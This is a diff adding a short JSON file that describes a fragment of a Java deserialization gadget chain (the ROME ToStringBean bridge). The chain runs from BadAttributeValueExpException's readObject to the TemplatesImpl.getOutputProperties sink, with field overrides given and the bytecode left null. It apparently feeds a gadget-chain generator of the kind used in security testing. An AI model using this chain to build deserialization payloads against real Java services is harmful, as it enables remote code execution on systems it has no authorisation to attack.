@@ -1,0 +1,23 @@
+{
+    "chain_type": "fragment: ToStringBean bridge (ROME gadgets)",
+    "root_class": "javax.management.BadAttributeValueExpException",
+    "root_trigger": "readObject→val.toString",
+    "links": [
+        {
+            "class": "com.sun.syndication.feed.impl.ToStringBean",
+            "field_overrides": {
+                "_beanClass": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+                "_obj": {"$ref": "link:1"}
+            }
+        },
+        {
+            "class": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+            "field_overrides": {
+                "_name": "exploit",
+                "_class": null,
+                "_bytecodes": null
+            }
+        }
+    ],
+    "sink_method": "TemplatesImpl.getOutputProperties"
+}
